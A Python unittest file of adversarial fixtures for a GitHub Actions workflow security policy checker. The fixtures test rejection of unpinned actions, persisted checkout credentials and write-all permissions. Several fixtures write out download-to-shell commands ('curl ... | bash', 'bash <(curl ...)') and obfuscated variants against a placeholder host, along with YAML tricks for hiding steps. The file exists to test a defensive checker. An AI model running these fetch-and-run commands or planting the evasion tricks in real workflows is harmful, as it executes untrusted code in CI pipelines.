#!/usr/bin/env python3
"""Adversarial fixtures for the Actions trust policy."""

from __future__ import annotations

import importlib.util
import tempfile
import unittest
from pathlib import Path


SCRIPT = Path(__file__).with_name("check-workflow-security.py")
SPEC = importlib.util.spec_from_file_location("workflow_security", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
POLICY = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(POLICY)

PIN = "a" * 40
CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
SAFE_RUN = "cargo fmt --all -- --check"


def workflow(body: str) -> str:
    return f"""name: policy-test
on:
  push:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
{body}
"""


class WorkflowSecurityTests(unittest.TestCase):
    def check(self, source: str) -> list[str]:
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "fixture.yml"
            path.write_text(source, encoding="utf-8")
            errors: list[str] = []
            POLICY.check_workflow(path, errors)
            return errors

    def test_remote_subdirectory_syntax_and_quoted_false_are_accepted(self) -> None:
        self.assertIsNotNone(
            POLICY.REMOTE_ACTION.fullmatch(
                f"owner/repository/subdirectory/action@{PIN}"
            )
        )
        source = workflow(
            f"""      - uses: {CHECKOUT}
        with:
          persist-credentials: "false"
"""
        )
        self.assertEqual(self.check(source), [])

    def test_flow_trigger_and_flow_step_fail_closed(self) -> None:
        flow_trigger = workflow("      - run: true\n").replace(
            "on:\n  push:\n", "on: [push, pull_request_target]\n"
        )
        self.assertTrue(any("flow-style" in error for error in self.check(flow_trigger)))

        flow_step = workflow(f"      - uses: {CHECKOUT}\n").replace(
            f"      - uses: {CHECKOUT}\n",
            f"      - {{uses: owner/repository@{PIN}}}\n",
        )
        self.assertTrue(any("flow-style" in error for error in self.check(flow_step)))

    def test_checkout_truthy_values_and_missing_with_are_rejected(self) -> None:
        for value in ('"true"', "True", "yes", "ON"):
            with self.subTest(value=value):
                source = workflow(
                    f"""      - uses: {CHECKOUT}
        with:
          persist-credentials: {value}
"""
                )
                errors = self.check(source)
                self.assertTrue(any("credentials" in error for error in errors), errors)

        missing = workflow(f"      - uses: {CHECKOUT}\n")
        self.assertTrue(any("credentials" in error for error in self.check(missing)))

    def test_checkout_accepts_noncanonical_but_valid_child_indentation(self) -> None:
        source = workflow(
            f"""      - uses: {CHECKOUT}
        with:
            persist-credentials: false
"""
        )
        self.assertEqual(self.check(source), [])

    def test_later_safe_checkout_cannot_cover_an_unsafe_named_step(self) -> None:
        source = workflow(
            f"""      - name: unsafe checkout
        uses: {CHECKOUT}
      - run: inspect-persisted-credentials
      - name: safe checkout
        uses: {CHECKOUT}
        with:
          persist-credentials: false
"""
        )
        credential_errors = [
            error for error in self.check(source) if "credentials" in error
        ]
        self.assertEqual(len(credential_errors), 1, credential_errors)

    def test_mutable_action_and_quoted_write_all_are_rejected(self) -> None:
        mutable = workflow("      - uses: owner/repository/action@main\n")
        self.assertTrue(any("40-hex" in error for error in self.check(mutable)))

        untrusted = workflow(f"      - uses: owner/repository/action@{PIN}\n")
        self.assertTrue(any("not allowlisted" in error for error in self.check(untrusted)))

        write_all = workflow("      - run: true\n").replace(
            "permissions:\n  contents: read", 'permissions: "write-all"'
        )
        self.assertTrue(any("write-all" in error for error in self.check(write_all)))

    def test_multiline_quoted_sensitive_values_fail_closed(self) -> None:
        continued_write = 'permissions: "write-' + "\\\n" + '  all"'
        write_all = workflow("      - run: true\n").replace(
            "permissions:\n  contents: read", continued_write
        )
        self.assertTrue(
            any("quoted YAML scalars" in error for error in self.check(write_all))
        )

        continued_event = 'on: "pull_request_' + "\\\n" + '  target"'
        pull_request_target = workflow("      - run: true\n").replace(
            "on:\n  push:", continued_event
        )
        self.assertTrue(
            any(
                "quoted YAML scalars" in error
                for error in self.check(pull_request_target)
            )
        )

    def test_download_to_shell_variants_are_rejected(self) -> None:
        commands = (
            "curl https://example.invalid/x | bash",
            "curl https://example.invalid/x|/bin/bash",
            "wget -qO- https://example.invalid/x | /usr/bin/env bash",
            "curl https://example.invalid/x | sudo -E /bin/sh",
            "curl https://example.invalid/x | 'bash'",
            "curl https://example.invalid/x | \\bash",
            "c\\url -fsSL https://example.invalid/x | bash",
            "bash <(curl https://example.invalid/x)",
        )
        for command in commands:
            with self.subTest(command=command):
                source = workflow(f"      - run: {command}\n")
                errors = self.check(source)
                self.assertTrue(any("curl/wget" in error for error in errors), errors)

        multiline = workflow(
            """      - run: |
          curl https://example.invalid/x |
            bash
"""
        )
        self.assertTrue(any("block-scalar" in error for error in self.check(multiline)))

    def test_cargo_install_must_match_an_exact_audited_command(self) -> None:
        accepted = workflow(
            "      - run: cargo install cargo-audit --version 0.22.2 --locked\n"
        )
        self.assertEqual(self.check(accepted), [])

        commands = (
            "cargo install cargo-audit",
            "cargo --version && cargo install unpinned",
            "cargo install cargo-audit --version 0.22.2 --locked && cargo install unpinned",
            "cargo install unpinned && echo --version",
            "ca''rgo install unpinned",
        )
        for command in commands:
            with self.subTest(command=command):
                errors = self.check(workflow(f"      - run: {command}\n"))
                self.assertTrue(
                    any("not allowlisted" in error for error in errors),
                    errors,
                )

        folded = workflow(
            """      - run: >
          cargo
          install unpinned
"""
        )
        self.assertTrue(any("block-scalar" in error for error in self.check(folded)))

    def test_yaml_indirection_is_rejected(self) -> None:
        source = workflow("      - &shared\n        run: true\n      - *shared\n")
        self.assertTrue(any("anchors" in error for error in self.check(source)))

        numeric = """env:
  EVENT_KEY: &1 pull_request_target
  USES_KEY: &2 uses
on:
  *1:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - *2: owner/repository@main
"""
        self.assertTrue(any("anchors" in error for error in self.check(numeric)))

    def test_yaml_tags_are_rejected(self) -> None:
        fixtures = (
            workflow("      - !!str uses: owner/repository@main\n"),
            workflow("      - !!str run: curl https://example.invalid/x | bash\n"),
            workflow("      - run: true\n").replace(
                "on:\n  push:\n", "on: !!seq [push, pull_request_target]\n"
            ),
        )
        for source in fixtures:
            with self.subTest(source=source):
                errors = self.check(source)
                self.assertTrue(any("YAML tags" in error for error in errors), errors)

        benign_bang = workflow(
            f"""      - name: echo !benign
        run: {SAFE_RUN}
"""
        )
        self.assertEqual(self.check(benign_bang), [])

    def test_noncanonical_mapping_keys_are_rejected(self) -> None:
        escaped = workflow(
            f'      - "u\\u0073es": owner/repository@{PIN}\n'
        )
        self.assertTrue(any("mapping keys" in error for error in self.check(escaped)))

        explicit = workflow(f"      - ? uses\n        : owner/repository@{PIN}\n")
        self.assertTrue(any("mapping keys" in error for error in self.check(explicit)))

    def test_local_actions_are_rejected_instead_of_trusted_transitively(self) -> None:
        source = workflow("      - uses: ./ci/bootstrap\n")
        self.assertTrue(any("local actions" in error for error in self.check(source)))

    def test_workflow_symlink_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "target"
            target.write_text(workflow(f"      - run: {SAFE_RUN}\n"), encoding="utf-8")
            path = root / "fixture.yml"
            path.symlink_to(target)
            errors: list[str] = []
            POLICY.check_workflow(path, errors)
        self.assertTrue(any("regular file" in error for error in errors), errors)

    def test_block_scalar_indicators_and_quoted_flow_text_are_accepted(self) -> None:
        source = workflow(
            f"""      - name: |2-
          value: [not YAML]
        run: {SAFE_RUN}
"""
        )
        self.assertEqual(self.check(source), [])

    def test_compact_block_scalar_does_not_hide_sibling_step_keys(self) -> None:
        mutable = workflow(
            """      - name: |
          bootstrap
        uses: owner/repository@main
"""
        )
        self.assertTrue(any("40-hex" in error for error in self.check(mutable)))

        checkout = workflow(
            f"""      - name: |
          bootstrap
        uses: {CHECKOUT}
"""
        )
        self.assertTrue(any("credentials" in error for error in self.check(checkout)))

        downloader = workflow(
            """      - name: |
          bootstrap
        run: curl https://example.invalid/x | bash
"""
        )
        self.assertTrue(any("curl/wget" in error for error in self.check(downloader)))

    def test_extra_dash_spacing_cannot_hide_sibling_step_keys(self) -> None:
        mutable = workflow(
            """      -   name: |
            bootstrap
          uses: owner/repository@main
"""
        )
        self.assertTrue(any("40-hex" in error for error in self.check(mutable)))

        checkout = workflow(
            f"""      -   name: |
            bootstrap
          uses: {CHECKOUT}
"""
        )
        self.assertTrue(any("credentials" in error for error in self.check(checkout)))

        downloader = workflow(
            """      -   name: |
            bootstrap
          run: curl https://example.invalid/x | bash
"""
        )
        self.assertTrue(any("curl/wget" in error for error in self.check(downloader)))


if __name__ == "__main__":
    unittest.main()
